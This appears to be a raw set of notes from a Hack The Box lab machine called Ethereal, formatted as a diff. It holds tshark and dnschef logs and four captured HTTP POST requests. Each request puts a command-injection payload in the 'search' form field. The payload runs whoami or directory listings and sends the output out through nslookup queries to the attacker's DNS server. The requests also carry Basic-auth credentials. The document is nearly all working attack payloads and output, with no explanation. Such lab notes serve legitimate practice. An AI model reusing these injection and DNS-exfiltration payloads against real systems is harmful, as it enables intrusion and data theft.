@@ -1,0 +1,112 @@
+
+
+
+############################################
+############################################
+
+root@kali:~/HTB/Ethereal# tshark -i tun0 -n -T fields -e dns.qry.name src port 53 
+Running as user "root" and group "root". This could be dangerous.
+Capturing on 'tun0'
+
+127.14.10.10.in-addr.arpa
+etherealalan
+etherealalan
+
+############################################
+
+root@kali:~/HTB/Ethereal# dnschef --fakeip=10.10.10.106 -i 10.10.14.127
+          _                _          __  
+         | | version 0.4  | |        / _| 
+       __| |_ __  ___  ___| |__   ___| |_ 
+      / _` | '_ \/ __|/ __| '_ \ / _ \  _|
+     | (_| | | | \__ \ (__| | | |  __/ |  
+      \__,_|_| |_|___/\___|_| |_|\___|_|  
+                   iphelix@thesprawl.org  
+
+(19:35:36) [*] DNSChef started on interface: 10.10.14.127
+(19:35:36) [*] Using the following nameservers: 8.8.8.8
+(19:35:36) [*] Cooking all A replies to point to 10.10.10.106
+
+
+(19:35:53) [*] 10.10.10.106: proxying the response of type 'PTR' for 127.14.10.10.in-addr.arpa
+(19:35:53) [*] 10.10.10.106: cooking the response of type 'A' for test.this.one.yo to 10.10.10.106
+(19:35:54) [*] 10.10.10.106: proxying the response of type 'AAAA' for test.this.one.yo
+
+
+
+(19:38:02) [*] 10.10.10.106: proxying the response of type 'PTR' for 127.14.10.10.in-addr.arpa
+(19:38:02) [*] 10.10.10.106: cooking the response of type 'A' for etherealalan to 10.10.10.106
+(19:38:02) [*] 10.10.10.106: proxying the response of type 'AAAA' for etherealalan
+
+############################################
+############################################
+
+
+POST / HTTP/1.1
+Host: ethereal.htb:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://ethereal.htb:8080/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 423
+Authorization: Basic YWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+__VIEWSTATE=%2FwEPDwULLTE0OTYxODU3NjgPZBYCAgMPFgIeCWlubmVyaHRtbAUdQ29ubmVjdGlvbiB0byBob3N0IHN1Y2Nlc3NmdWxkZGx2vSQPQjsGooMjDK8%2FrHvC67fhNlxSb0WMURo%2FekEc&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAPdfUGOYAU4Nt8XSZEblc6L4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p%2B9jPAN%2F6O4aYA9wrKXGxmbYmWC887bLRPuHRrTaZJWVK0ckoqQ%3D%3D&search=127.0.0.1+%26+for+%2Ff+%25i+in+%28%27whoami%27%29+do+nslookup+%25i+10.10.14.127&ctl02=
+
+
+############################################
+
+POST / HTTP/1.1
+Host: ethereal.htb:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://ethereal.htb:8080/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 437
+Authorization: Basic YWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+__VIEWSTATE=%2FwEPDwULLTE0OTYxODU3NjgPZBYCAgMPFgIeCWlubmVyaHRtbAUdQ29ubmVjdGlvbiB0byBob3N0IHN1Y2Nlc3NmdWxkZGx2vSQPQjsGooMjDK8%2FrHvC67fhNlxSb0WMURo%2FekEc&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAPdfUGOYAU4Nt8XSZEblc6L4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p%2B9jPAN%2F6O4aYA9wrKXGxmbYmWC887bLRPuHRrTaZJWVK0ckoqQ%3D%3D&search=127.0.0.1+%26+for+%2Ff+%25i+in+%28%27dir /b c:\users\alan%27%29+do+nslookup+%25i+10.10.14.127&ctl02=
+
+############################################
+
+POST / HTTP/1.1
+Host: ethereal.htb:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://ethereal.htb:8080/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 446
+Authorization: Basic YWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+__VIEWSTATE=%2FwEPDwULLTE0OTYxODU3NjgPZBYCAgMPFgIeCWlubmVyaHRtbAUdQ29ubmVjdGlvbiB0byBob3N0IHN1Y2Nlc3NmdWxkZGx2vSQPQjsGooMjDK8%2FrHvC67fhNlxSb0WMURo%2FekEc&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAPdfUGOYAU4Nt8XSZEblc6L4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p%2B9jPAN%2F6O4aYA9wrKXGxmbYmWC887bLRPuHRrTaZJWVK0ckoqQ%3D%3D&search=127.0.0.1+%26+for+%2Ff+%25i+in+%28%27dir /b c:\users\alan\desktop\%27%29+do+nslookup+%25i+10.10.14.127&ctl02=
+
+############################################
+
+POST / HTTP/1.1
+Host: ethereal.htb:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://ethereal.htb:8080/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 436
+Authorization: Basic YWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+__VIEWSTATE=%2FwEPDwULLTE0OTYxODU3NjgPZBYCAgMPFgIeCWlubmVyaHRtbAUdQ29ubmVjdGlvbiB0byBob3N0IHN1Y2Nlc3NmdWxkZGx2vSQPQjsGooMjDK8%2FrHvC67fhNlxSb0WMURo%2FekEc&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAPdfUGOYAU4Nt8XSZEblc6L4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p%2B9jPAN%2F6O4aYA9wrKXGxmbYmWC887bLRPuHRrTaZJWVK0ckoqQ%3D%3D&search=127.0.0.1+%26+for+%2Ff+%25i+in+%28%27dir /b c:\Windows\\%27%29+do+nslookup+%25i+10.10.14.127&ctl02=
+
+############################################
